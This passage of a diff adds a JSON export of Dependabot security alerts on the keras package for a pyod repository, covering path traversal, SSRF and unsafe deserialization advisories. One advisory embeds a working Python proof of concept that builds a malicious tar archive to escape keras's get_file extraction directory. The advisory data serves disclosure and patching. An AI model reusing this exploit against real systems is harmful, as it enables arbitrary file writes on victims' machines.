+                    "url": "https://github.com/advisories/GHSA-4f3f-g24h-fr8m"
+                }
+            ],
+            "published_at": "2026-04-13T15:31:42Z",
+            "updated_at": "2026-04-14T23:17:13Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "keras"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": "< 3.13.2",
+                    "first_patched_version": {
+                        "identifier": "3.13.2"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+                    "score": 8.8
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "epss": {
+                "percentage": 0.00405,
+                "percentile": 0.33529
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+                "score": 8.8
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-502",
+                    "name": "Deserialization of Untrusted Data"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "keras"
+            },
+            "severity": "high",
+            "vulnerable_version_range": "< 3.13.2",
+            "first_patched_version": {
+                "identifier": "3.13.2"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/pyod/dependabot/alerts/7",
+        "html_url": "https://github.com/fcas/pyod/security/dependabot/7",
+        "created_at": "2026-04-14T23:17:26Z",
+        "updated_at": "2026-08-14T16:09:57Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": "2026-08-14T16:09:57Z",
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 6,
+        "state": "fixed",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "keras"
+            },
+            "manifest_path": "docs/requirements.txt",
+            "scope": "runtime",
+            "relationship": "unknown"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-hjqc-jx6g-rwp9",
+            "cve_id": "CVE-2025-12060",
+            "summary": "Keras Directory Traversal Vulnerability",
+            "description": "## Summary\n\nKeras's `keras.utils.get_file()` function is vulnerable to directory traversal attacks despite implementing `filter_safe_paths()`. The vulnerability exists because `extract_archive()` uses Python's `tarfile.extractall()` method without the security-critical `filter=\"data\"` parameter. A PATH_MAX symlink resolution bug occurs before path filtering, allowing malicious tar archives to bypass security checks and write files outside the intended extraction directory.\n\n## Details\n\n### Root Cause Analysis\n\n**Current Keras Implementation**\n```python\n# From keras/src/utils/file_utils.py#L121\nif zipfile.is_zipfile(file_path):\n    # Zip archive.\n    archive.extractall(path)\nelse:\n    # Tar archive, perhaps unsafe. Filter paths.\n    archive.extractall(path, members=filter_safe_paths(archive))\n```\n\n### The Critical Flaw\n\nWhile Keras attempts to filter unsafe paths using `filter_safe_paths()`, this filtering happens after the tar archive members are parsed and before actual extraction. However, the PATH_MAX symlink resolution bug occurs during extraction, not during member enumeration.\n\n**Exploitation Flow:**\n1. **Archive parsing**: `filter_safe_paths()` sees symlink paths that appear safe\n2. **Extraction begins**: `extractall()` processes the filtered members\n3. **PATH_MAX bug triggers**: Symlink resolution fails due to path length limits\n4. **Security bypass**: Failed resolution causes literal path interpretation\n5. **Directory traversal**: Files written outside intended directory\n\n### Technical Details\n\nThe vulnerability exploits a known issue in Python's `tarfile` module where excessively long symlink paths can cause resolution failures, leading to the symlink being treated as a literal path. This bypasses Keras's path filtering because:\n\n- `filter_safe_paths()` operates on the parsed tar member information\n- The PATH_MAX bug occurs during actual file system operations in `extractall()`\n- Failed symlink resolution falls back to literal path interpretation\n- This allows traversal paths like `../../../../etc/passwd` to be written\n\n### Affected Code Location\n\n**File**: `keras/src/utils/file_utils.py`  \n**Function**: `extract_archive()` around line 121  \n**Issue**: Missing `filter=\"data\"` parameter in `tarfile.extractall()`\n\n## Proof of Concept\n```\n#!/usr/bin/env python3\nimport os, io, sys, tarfile, pathlib, platform, threading, time\nimport http.server, socketserver\n\n# Import Keras directly (not through TensorFlow)\ntry:\n    import keras\n    print(\"Using standalone Keras:\", keras.__version__)\n    get_file = keras.utils.get_file\nexcept ImportError:\n    try:\n        import tensorflow as tf\n        print(\"Using Keras via TensorFlow:\", tf.keras.__version__)\n        get_file = tf.keras.utils.get_file\n    except ImportError:\n        print(\"Neither Keras nor TensorFlow found!\")\n        sys.exit(1)\n\nprint(\"=\" * 60)\nprint(\"Keras get_file() PATH_MAX Symlink Vulnerability PoC\")\nprint(\"=\" * 60)\nprint(\"Python:\", sys.version.split()[0])\nprint(\"Platform:\", platform.platform())\n\nroot = pathlib.Path.cwd()\nprint(f\"Working directory: {root}\")\n\n# Create target directory for exploit demonstration\nexploit_dir = root / \"exploit\"\nexploit_dir.mkdir(exist_ok=True)\n\n# Clean up any previous exploit files\ntry:\n    (exploit_dir / \"keras_pwned.txt\").unlink()\nexcept FileNotFoundError:\n    pass\n\nprint(f\"\\n=== INITIAL STATE ===\")\nprint(f\"Exploit directory: {exploit_dir}\")\nprint(f\"Files in exploit/: {[f.name for f in exploit_dir.iterdir()]}\")\n\n# Create malicious tar with PATH_MAX symlink resolution bug\nprint(f\"\\n=== Building PATH_MAX Symlink Exploit ===\")\n\n# Parameters for PATH_MAX exploitation\ncomp = 'd' * (55 if sys.platform == 'darwin' else 247)\nsteps = \"abcdefghijklmnop\"  # 16-step symlink chain\npath = \"\"\n\nwith tarfile.open(\"keras_dataset.tgz\", mode=\"w:gz\") as tar:\n    print(\"Creating deep symlink chain...\")\n    \n    # Build the symlink chain that will exceed PATH_MAX during resolution\n    for i, step in enumerate(steps):\n        # Directory with long name\n        dir_info = tarfile.TarInfo(os.path.join(path, comp))\n        dir_info.type = tarfile.DIRTYPE\n        tar.addfile(dir_info)\n        \n        # Symlink pointing to that directory\n        link_info = tarfile.TarInfo(os.path.join(path, step))\n        link_info.type = tarfile.SYMTYPE\n        link_info.linkname = comp\n        tar.addfile(link_info)\n        \n        path = os.path.join(path, comp)\n        \n        if i < 3 or i % 4 == 0:  # Print progress for first few and every 4th\n            print(f\"  Step {i+1}: {step} -> {comp[:20]}...\")\n    \n    # Create the final symlink that exceeds PATH_MAX\n    # This is where the symlink resolution breaks down\n    long_name = \"x\" * 254\n    linkpath = os.path.join(\"/\".join(steps), long_name)\n    \n    max_link = tarfile.TarInfo(linkpath)\n    max_link.type = tarfile.SYMTYPE\n    max_link.linkname = (\"../\" * len(steps))\n    tar.addfile(max_link)\n    \n    print(f\"✓ Created PATH_MAX symlink: {len(linkpath)} characters\")\n    print(f\"  Points to: {'../' * len(steps)}\")\n    \n    # Exploit file through the broken symlink resolution\n    exploit_path = linkpath + \"/../../../exploit/keras_pwned.txt\"\n    exploit_content = b\"KERAS VULNERABILITY CONFIRMED!\\nThis file was created outside the cache directory!\\nKeras get_file() is vulnerable to PATH_MAX symlink attacks!\\n\"\n    \n    exploit_file = tarfile.TarInfo(exploit_path)\n    exploit_file.type = tarfile.REGTYPE\n    exploit_file.size = len(exploit_content)\n    tar.addfile(exploit_file, fileobj=io.BytesIO(exploit_content))\n    \n    print(f\"✓ Added exploit file via broken symlink path\")\n    \n    # Add legitimate dataset content\n    dataset_content = b\"# Keras Dataset Sample\\nThis appears to be a legitimate ML dataset\\nimage1.jpg,cat\\nimage2.jpg,dog\\nimage3.jpg,bird\\n\"\n    dataset_file = tarfile.TarInfo(\"dataset/labels.csv\")\n    dataset_file.type = tarfile.REGTYPE\n    dataset_file.size = len(dataset_content)\n    tar.addfile(dataset_file, fileobj=io.BytesIO(dataset_content))\n    \n    # Dataset directory\n    dataset_dir = tarfile.TarInfo(\"dataset/\")\n    dataset_dir.type = tarfile.DIRTYPE\n    tar.addfile(dataset_dir)\n\nprint(\"✓ Malicious Keras dataset created\")\n\n# Comparison Test: Python tarfile with filter (SAFE)\nprint(f\"\\n=== COMPARISON: Python tarfile with data filter ===\")\ntry:\n    with tarfile.open(\"keras_dataset.tgz\", \"r:gz\") as tar:\n        tar.extractall(\"python_safe\", filter=\"data\")\n    \n    files_after = [f.name for f in exploit_dir.iterdir()]\n    print(f\"✓ Python safe extraction completed\")\n    print(f\"Files in exploit/: {files_after}\")\n    \n    # Cleanup\n    import shutil\n    if pathlib.Path(\"python_safe\").exists():\n        shutil.rmtree(\"python_safe\", ignore_errors=True)\n        \nexcept Exception as e:\n    print(f\"❌ Python safe extraction blocked: {str(e)[:80]}...\")\n    files_after = [f.name for f in exploit_dir.iterdir()]\n    print(f\"Files in exploit/: {files_after}\")\n\n# Start HTTP server to serve malicious archive\nclass SilentServer(http.server.SimpleHTTPRequestHandler):\n    def log_message(self, *args): pass\n\ndef run_server():\n    with socketserver.TCPServer((\"127.0.0.1\", 8005), SilentServer) as httpd:\n        httpd.allow_reuse_address = True\n        httpd.serve_forever()\n\nserver = threading.Thread(target=run_server, daemon=True)\nserver.start()\ntime.sleep(0.3)\n\n# Keras vulnerability test\ncache_dir = root / \"keras_cache\"\ncache_dir.mkdir(exist_ok=True)\nurl = \"http://127.0.0.1:8005/keras_dataset.tgz\"\n\nprint(f\"\\n=== KERAS VULNERABILITY TEST ===\")\nprint(f\"Testing: keras.utils.get_file() with extract=True\")\nprint(f\"URL: {url}\")\nprint(f\"Cache: {cache_dir}\")\nprint(f\"Expected extraction: keras_cache/datasets/keras_dataset/\")\nprint(f\"Exploit target: exploit/keras_pwned.txt\")\n\ntry:\n    # The vulnerable Keras call\n    extracted_path = get_file(\n        \"keras_dataset\",\n        url,\n        cache_dir=str(cache_dir),\n        extract=True\n    )\n    print(f\"✓ Keras extraction completed\")\n    print(f\"✓ Returned path: {extracted_path}\")\n    \nexcept Exception as e:\n    print(f\"❌ Keras extraction failed: {e}\")\n    import traceback\n    traceback.print_exc()\n\n# Vulnerability assessment\nprint(f\"\\n=== VULNERABILITY RESULTS ===\")\nfinal_exploit_files = [f.name for f in exploit_dir.iterdir()]\nprint(f\"Files in exploit directory: {final_exploit_files}\")\n\nif \"keras_pwned.txt\" in final_exploit_files:\n    print(f\"\\n🚨 KERAS VULNERABILITY CONFIRMED! 🚨\")\n    \n    exploit_file = exploit_dir / \"keras_pwned.txt\"\n    content = exploit_file.read_text()\n    print(f\"Exploit file created: {exploit_file}\")\n    print(f\"Content:\\n{content}\")\n    \n    print(f\"🔍 TECHNICAL DETAILS:\")\n    print(f\"   • Keras uses tarfile.extractall() without filter parameter\")\n    print(f\"   • PATH_MAX symlink resolution bug bypassed security checks\")\n    print(f\"   • File created outside intended cache directory\")\n    print(f\"   • Same vulnerability pattern as TensorFlow get_file()\")\n    \n    print(f\"\\n📊 COMPARISON RESULTS:\")\n    print(f\"   ✅ Python with filter='data': BLOCKED exploit\")\n    print(f\"   ⚠️  Keras get_file(): ALLOWED exploit\")\n    \nelse:\n    print(f\"✅ No exploit files detected\")\n    print(f\"Possible reasons:\")\n    print(f\"   • Keras version includes security patches\")\n    print(f\"   • Platform-specific path handling prevented exploit\")\n    print(f\"   • Archive extraction path differed from expected\")\n\n# Show what Keras actually extracted (safely)\nprint(f\"\\n=== KERAS EXTRACTION ANALYSIS ===\")\ntry:\n    if 'extracted_path' in locals() and pathlib.Path(extracted_path).exists():\n        keras_path = pathlib.Path(extracted_path)\n        print(f\"Keras extracted to: {keras_path}\")\n        \n        # Safely list contents\n        try:\n            contents = [item.name for item in keras_path.iterdir()]\n            print(f\"Top-level contents: {contents}\")\n            \n            # Count symlinks (indicates our exploit structure was created)\n            symlink_count = 0\n            for item in keras_path.iterdir():\n                try:\n                    if item.is_symlink():\n                        symlink_count += 1\n                except PermissionError:\n                    continue\n            \n            print(f\"Symlinks created: {symlink_count}\")\n            if symlink_count > 0:\n                print(f\"✓ PATH_MAX symlink chain was extracted\")\n                \n        except PermissionError:\n            print(f\"Permission errors in extraction directory (expected with symlink corruption)\")\n            \nexcept Exception as e:\n    print(f\"Could not analyze Keras extraction: {e}\")\n\nprint(f\"\\n=== REMEDIATION ===\")\nprint(f\"To fix this vulnerability, Keras should use:\")\nprint(f\"```python\")\nprint(f\"tarfile.extractall(path, filter='data')  # Safe\")\nprint(f\"```\")\nprint(f\"Instead of:\")\nprint(f\"```python\") \nprint(f\"tarfile.extractall(path)  # Vulnerable\")\nprint(f\"```\")\n\n# Cleanup\nprint(f\"\\n=== CLEANUP ===\")\ntry:\n    os.unlink(\"keras_dataset.tgz\")\n    print(f\"✓ Removed malicious tar file\")\nexcept:\n    pass\n\nprint(\"PoC completed!\")\n\n```\n### Environment Setup\n- **Python**: 3.8+ (tested on multiple versions)\n- **Keras**: Standalone Keras or TensorFlow.Keras\n- **Platform**: Linux, macOS, Windows (path handling varies)\n\n### Exploitation Steps\n\n1. **Create malicious tar archive** with PATH_MAX symlink chain\n2. **Host archive** on accessible HTTP server\n3. **Call `keras.utils.get_file()`** with `extract=True`\n4. **Observe directory traversal** - files written outside cache directory\n\n### Key Exploit Components\n\n- **Deep symlink chain**: 16+ nested symlinks with long directory names\n- **PATH_MAX overflow**: Final symlink path exceeding system limits\n- **Traversal payload**: Relative path traversal (`../../../target/file`)\n- **Legitimate disguise**: Archive contains valid-looking dataset files\n\n### Demonstration Results\n\n**Vulnerable behavior:**\n- Files extracted outside intended `cache_dir/datasets/` location\n- Security filtering bypassed completely\n- No error or warning messages generated\n\n**Expected secure behavior:**\n- Extraction blocked or confined to cache directory\n- Security warnings for suspicious archive contents\n\n## Impact\n\n### Vulnerability Classification\n- **Type**: Directory Traversal / Path Traversal (CWE-22)\n- **Severity**: High\n- **CVSS Components**: Network accessible, no authentication required, impacts confidentiality and integrity\n\n### Who Is Impacted\n\n**Direct Impact:**\n- Applications using `keras.utils.get_file()` with `extract=True`\n- Machine learning pipelines downloading and extracting datasets\n- Automated ML training systems processing external archives\n\n**Attack Scenarios:**\n1. **Malicious datasets**: Attacker hosts compromised ML dataset\n2. **Supply chain**: Legitimate dataset repositories compromised\n3. **Model poisoning**: Extraction writes malicious files alongside training data\n4. **System compromise**: Configuration files, executables written to system directories\n\n**Affected Environments:**\n- Research environments downloading public datasets\n- Production ML systems with automated dataset fetching\n- Educational platforms using Keras for tutorials\n- CI/CD pipelines training models with external data\n\n### Risk Assessment\n\n**High Risk Factors:**\n- Common usage pattern in ML workflows\n- No user awareness of extraction security\n- Silent failure mode (no warnings)\n- Cross-platform vulnerability\n\n**Potential Consequences:**\n- Arbitrary file write on target system\n- Configuration file tampering\n- Code injection via overwritten scripts\n- Data exfiltration through planted files\n- System compromise in containerized environments\n\n## Recommended Fix\n\n### Immediate Mitigation\n\nReplace the vulnerable extraction code with:\n\n```python\n# Secure implementation\nif zipfile.is_zipfile(file_path):\n    # Zip archive - implement similar filtering\n    archive.extractall(path, members=filter_safe_paths(archive))\nelse:\n    # Tar archive with proper security filter\n    archive.extractall(path, members=filter_safe_paths(archive), filter=\"data\")\n```\n\n### Long-term Solution\n\n1. **Add `filter=\"data\"` parameter** to all `tarfile.extractall()` calls\n2. **Implement comprehensive path validation** before extraction\n3. **Add extraction logging** for security monitoring\n4. **Consider sandboxed extraction** for untrusted archives\n5. **Update documentation** to warn about archive security risks\n\n### Backward Compatibility\n\nThe fix maintains full backward compatibility as `filter=\"data\"` is the recommended secure default for Python 3.12+.\n\n## References\n\n- [[Python tarfile security documentation](https://docs.python.org/3/library/tarfile.html#extraction-filters)](https://docs.python.org/3/library/tarfile.html#extraction-filters)\n- [[CVE-2007-4559](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4559)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4559) - Related tarfile vulnerability\n- [[OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)](https://owasp.org/www-community/attacks/Path_Traversal)\n\nNote: Reported in Huntr as well, but didn't get response\nhttps://huntr.com/bounties/f94f5beb-54d8-4e6a-8bac-86d9aee103f4",
+            "severity": "high",
+            "identifiers": [
+                {
+                    "value": "GHSA-hjqc-jx6g-rwp9",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2025-12060",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/keras-team/keras/security/advisories/GHSA-hjqc-jx6g-rwp9"
+                },
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-12060"
+                },
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-12638"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/pull/21760"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/commit/47fcb397ee4caffd5a75efd1fa3067559594e951"
+                },
+                {
+                    "url": "https://huntr.com/bounties/f94f5beb-54d8-4e6a-8bac-86d9aee103f4"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-hjqc-jx6g-rwp9"
+                }
+            ],
+            "published_at": "2025-12-02T00:58:33Z",
+            "updated_at": "2025-12-02T00:58:33Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "keras"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": "<= 3.11.3",
+                    "first_patched_version": {
+                        "identifier": "3.12.0"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+                    "score": 9.8
+                },
+                "cvss_v4": {
+                    "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:P/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
+                    "score": 8.9
+                }
+            },
+            "epss": {
+                "percentage": 0.00584,
+                "percentile": 0.44578
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+                "score": 9.8
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-22",
+                    "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "keras"
+            },
+            "severity": "high",
+            "vulnerable_version_range": "<= 3.11.3",
+            "first_patched_version": {
+                "identifier": "3.12.0"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/pyod/dependabot/alerts/6",
+        "html_url": "https://github.com/fcas/pyod/security/dependabot/6",
+        "created_at": "2025-12-02T01:31:44Z",
+        "updated_at": "2026-08-14T16:09:57Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": "2026-08-14T16:09:57Z",
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 4,
+        "state": "fixed",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "keras"
+            },
+            "manifest_path": "docs/requirements.txt",
+            "scope": "runtime",
+            "relationship": "unknown"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-mq84-hjqx-cwf2",
+            "cve_id": "CVE-2025-12058",
+            "summary": "Keras is vulnerable to arbitrary local file loading and Server-Side Request Forgery",
+            "description": "The Keras.Model.load_model method, including when executed with the intended security mitigation safe_mode=True, is vulnerable to arbitrary local file loading and Server-Side Request Forgery (SSRF).\n\n\nThis vulnerability stems from the way the StringLookup layer is handled during model loading from a specially crafted .keras archive. The constructor for the StringLookup layer accepts a vocabulary argument that can specify a local file path or a remote file path.\n\n  *  Arbitrary Local File Read: An attacker can create a malicious .keras file that embeds a local path in the StringLookup layer's configuration. When the model is loaded, Keras will attempt to read the content of the specified local file and incorporate it into the model state (e.g., retrievable via get_vocabulary()), allowing an attacker to read arbitrary local files on the hosting system.\n\n\n  *  Server-Side Request Forgery (SSRF): Keras utilizes tf.io.gfile for file operations. Since tf.io.gfile supports remote filesystem handlers (such as GCS and HDFS) and HTTP/HTTPS protocols, the same mechanism can be leveraged to fetch content from arbitrary network endpoints on the server's behalf, resulting in an SSRF condition.\n\n\nThe security issue is that the feature allowing external path loading was not properly restricted by the safe_mode=True flag, which was intended to prevent such unintended data access.",
+            "severity": "medium",
+            "identifiers": [
+                {
+                    "value": "GHSA-mq84-hjqx-cwf2",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2025-12058",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/keras-team/keras/security/advisories/GHSA-qg93-c7p6-gg7f"
+                },
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-12058"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/pull/21751"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/commit/61ac8c1e51862c471dee7b49029c356f55531487"
+                },
+                {
+                    "url": "https://www.cve.org/CVERecord?id=CVE-2025-12058"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-mq84-hjqx-cwf2"
+                }
+            ],
+            "published_at": "2025-10-29T09:30:22Z",
+            "updated_at": "2025-10-29T16:04:41Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "keras"
+                    },
+                    "severity": "medium",
+                    "vulnerable_version_range": "< 3.12.0",
+                    "first_patched_version": {
+                        "identifier": "3.12.0"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": null,
+                    "score": 0.0
+                },
+                "cvss_v4": {
+                    "vector_string": "CVSS:4.0/AV:A/AC:H/AT:P/PR:L/UI:P/VC:H/VI:L/VA:L/SC:H/SI:L/SA:L/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
+                    "score": 5.9
+                }
+            },
+            "epss": {
+                "percentage": 0.00245,
+                "percentile": 0.15821
+            },
+            "cvss": {
+                "vector_string": null,
+                "score": 0.0
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-502",
+                    "name": "Deserialization of Untrusted Data"
+                },
+                {
+                    "cwe_id": "CWE-918",
+                    "name": "Server-Side Request Forgery (SSRF)"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "keras"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": "< 3.12.0",
+            "first_patched_version": {
+                "identifier": "3.12.0"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/pyod/dependabot/alerts/4",
+        "html_url": "https://github.com/fcas/pyod/security/dependabot/4",
+        "created_at": "2025-10-29T16:04:54Z",
+        "updated_at": "2026-08-14T16:09:57Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": "2026-08-14T16:09:57Z",
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 3,
+        "state": "fixed",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "keras"
+            },
+            "manifest_path": "docs/requirements.txt",
+            "scope": "runtime",
+            "relationship": "unknown"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-36fq-jgmw-4r9c",
+            "cve_id": "CVE-2025-9906",
+            "summary": "Keras is vulnerable to Deserialization of Untrusted Data",
+            "description": "### Arbitrary Code Execution in Keras\n\nKeras versions prior to 3.11.0 allow for arbitrary code execution when loading a crafted `.keras` model archive, even when `safe_mode=True`.\n\nThe issue arises because the archive’s `config.json` is parsed before layer deserialization. This can invoke `keras.config.enable_unsafe_deserialization()`, effectively disabling safe mode from within the loading process itself. An attacker can place this call first in the archive and then include a `Lambda` layer whose function is deserialized from a pickle, leading to the execution of attacker-controlled Python code as soon as a victim loads the model file.\n\nExploitation requires a user to open an untrusted model; no additional privileges are needed. The fix in version 3.11.0 enforces safe-mode semantics *before* reading any user-controlled configuration and prevents the toggling of unsafe deserialization via the config file.\n\n**Affected versions:** < 3.11.0\n**Patched version:** 3.11.0\n\nIt is recommended to upgrade to version 3.11.0 or later and to avoid opening untrusted model files.",
+            "severity": "high",
+            "identifiers": [
+                {
+                    "value": "GHSA-36fq-jgmw-4r9c",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2025-9906",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-9906"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/pull/21429"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/commit/713172ab56b864e59e2aa79b1a51b0e728bba858"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/releases/tag/v3.11.0"
+                },
+                {
+                    "url": "https://osv.dev/vulnerability/CVE-2025-9906"
+                },
+                {
+                    "url": "https://github.com/pypa/advisory-database/tree/main/vulns/keras/PYSEC-2025-76.yaml"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-36fq-jgmw-4r9c"
+                }
+            ],
+            "published_at": "2025-09-19T09:31:14Z",
+            "updated_at": "2026-05-29T20:51:09Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "keras"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": "< 3.11.0",
+                    "first_patched_version": {
+                        "identifier": "3.11.0"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H",
+                    "score": 7.3
+                },
+                "cvss_v4": {
+                    "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+                    "score": 8.7
+                }
+            },
+            "epss": {
+                "percentage": 0.00186,
+                "percentile": 0.08423
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H",
+                "score": 7.3
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-502",
+                    "name": "Deserialization of Untrusted Data"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "keras"
+            },
+            "severity": "high",
+            "vulnerable_version_range": "< 3.11.0",
+            "first_patched_version": {
+                "identifier": "3.11.0"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/pyod/dependabot/alerts/3",
+        "html_url": "https://github.com/fcas/pyod/security/dependabot/3",
+        "created_at": "2025-09-19T17:16:54Z",
+        "updated_at": "2026-08-14T16:09:56Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": "2026-08-14T16:09:56Z",
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 1,
+        "state": "fixed",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "keras"
+            },
+            "manifest_path": "docs/requirements.txt",
+            "scope": "runtime",
+            "relationship": "unknown"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-cjgq-5qmw-rcj6",
+            "cve_id": "CVE-2024-55459",
+            "summary": "keras Path Traversal vulnerability",
+            "description": "An issue in keras 3.7.0 allows attackers to write arbitrary files to the user's machine via downloading a crafted tar file through the get_file function.",
+            "severity": "medium",
+            "identifiers": [
+                {
+                    "value": "GHSA-cjgq-5qmw-rcj6",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2024-55459",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-55459"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras"
+                },
+                {
+                    "url": "https://keras.io"
+                },
+                {
+                    "url": "https://river-bicycle-f1e.notion.site/Arbitrary-File-Write-Vulnerability-in-get_file-function-11888e31952580179224e50892976d32"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/blob/8f5592bcb61ff48c96560c8923e482db1076b54a/keras/src/utils/file_utils.py#L115"
+                },
+                {
+                    "url": "https://github.com/pypa/advisory-database/tree/main/vulns/keras/PYSEC-2025-121.yaml"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-cjgq-5qmw-rcj6"
+                }
+            ],
+            "published_at": "2025-01-08T18:30:48Z",
+            "updated_at": "2026-06-06T00:29:29Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "keras"
+                    },
+                    "severity": "medium",
+                    "vulnerable_version_range": "<= 3.7.0",
+                    "first_patched_version": null
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": null,
+                    "score": 0.0
+                },
+                "cvss_v4": {
+                    "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
+                    "score": 5.5
+                }
+            },
+            "epss": {
+                "percentage": 0.00231,
+                "percentile": 0.14005
+            },
+            "cvss": {
+                "vector_string": null,
+                "score": 0.0
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-22",
+                    "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "keras"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": "<= 3.7.0",
